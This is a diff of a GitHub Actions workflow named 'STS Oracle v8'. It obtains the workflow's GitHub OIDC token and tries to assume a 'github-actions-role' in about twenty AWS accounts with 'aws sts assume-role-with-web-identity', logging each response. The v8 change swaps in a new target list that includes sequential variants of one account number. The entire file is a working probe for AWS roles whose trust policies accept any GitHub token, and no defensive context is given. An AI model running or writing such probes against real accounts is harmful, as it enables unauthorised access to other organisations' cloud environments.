@@ -1,4 +1,4 @@
-name: STS Oracle v7
+name: STS Oracle v8
 on:
   workflow_dispatch:
 
@@ -10,88 +10,89 @@ jobs:
   probe:
     runs-on: ubuntu-latest
     steps:
-      - name: STS Probe v7 (exact detection run format)
+      - name: STS Probe v8 targeted
         run: |
           TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
           echo "TOKEN_OK=true"
-            R_CALIB=$(aws sts assume-role-with-web-identity \
+
+            R_V00=$(aws sts assume-role-with-web-identity \
               --role-arn "arn:aws:iam::062341577280:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "062341577280: $R_CALIB"
-            R_A=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::940202570803:role/github-actions-role" \
+            echo "062341577280: $R_V00"
+            R_V01=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::641684308908:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "940202570803: $R_A"
-            R_B=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::975050157552:role/github-actions-role" \
+            echo "641684308908: $R_V01"
+            R_V02=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::641684308907:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "975050157552: $R_B"
-            R_C=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::442042546671:role/github-actions-role" \
+            echo "641684308907: $R_V02"
+            R_V03=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::641684308909:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "442042546671: $R_C"
-            R_D=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::590183853468:role/github-actions-role" \
+            echo "641684308909: $R_V03"
+            R_V04=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::641684308000:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "590183853468: $R_D"
-            R_E=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::492374225042:role/github-actions-role" \
+            echo "641684308000: $R_V04"
+            R_V05=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::641684309000:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "492374225042: $R_E"
-            R_F=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::941377116779:role/github-actions-role" \
+            echo "641684309000: $R_V05"
+            R_V06=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::641684300000:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "941377116779: $R_F"
-            R_G=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::847111281529:role/github-actions-role" \
+            echo "641684300000: $R_V06"
+            R_V07=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::956793135828:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "847111281529: $R_G"
-            R_H=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::381491896068:role/github-actions-role" \
+            echo "956793135828: $R_V07"
+            R_V08=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::295677954931:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "381491896068: $R_H"
-            R_I=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::730335619062:role/github-actions-role" \
+            echo "295677954931: $R_V08"
+            R_V09=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::354741481218:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "730335619062: $R_I"
-            R_J=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::582318560589:role/github-actions-role" \
+            echo "354741481218: $R_V09"
+            R_V10=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::492737817619:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "582318560589: $R_J"
-            R_K=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::211125461067:role/github-actions-role" \
+            echo "492737817619: $R_V10"
+            R_V11=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::547218364920:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "211125461067: $R_K"
-            R_L=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::270841023592:role/github-actions-role" \
+            echo "547218364920: $R_V11"
+            R_V12=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::619283749012:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "270841023592: $R_L"
-            R_M=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::471234567890:role/github-actions-role" \
+            echo "619283749012: $R_V12"
+            R_V13=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::783920154836:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "471234567890: $R_M"
-            R_N=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::832123456789:role/github-actions-role" \
+            echo "783920154836: $R_V13"
+            R_V14=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::864123798520:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "832123456789: $R_N"
-            R_O=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::908765432109:role/github-actions-role" \
+            echo "864123798520: $R_V14"
+            R_V15=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::920384751028:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "908765432109: $R_O"
-            R_P=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::184832476285:role/github-actions-role" \
+            echo "920384751028: $R_V15"
+            R_V16=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::034827163945:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "184832476285: $R_P"
-            R_Q=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::285947381625:role/github-actions-role" \
+            echo "034827163945: $R_V16"
+            R_V17=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::019273847560:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "285947381625: $R_Q"
-            R_R=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::392847261583:role/github-actions-role" \
+            echo "019273847560: $R_V17"
+            R_V18=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::082736491528:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "392847261583: $R_R"
-            R_S=$(aws sts assume-role-with-web-identity \
-              --role-arn "arn:aws:iam::472638159274:role/github-actions-role" \
+            echo "082736491528: $R_V18"
+            R_V19=$(aws sts assume-role-with-web-identity \
+              --role-arn "arn:aws:iam::163748295017:role/github-actions-role" \
               --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
-            echo "472638159274: $R_S"
+            echo "163748295017: $R_V19"
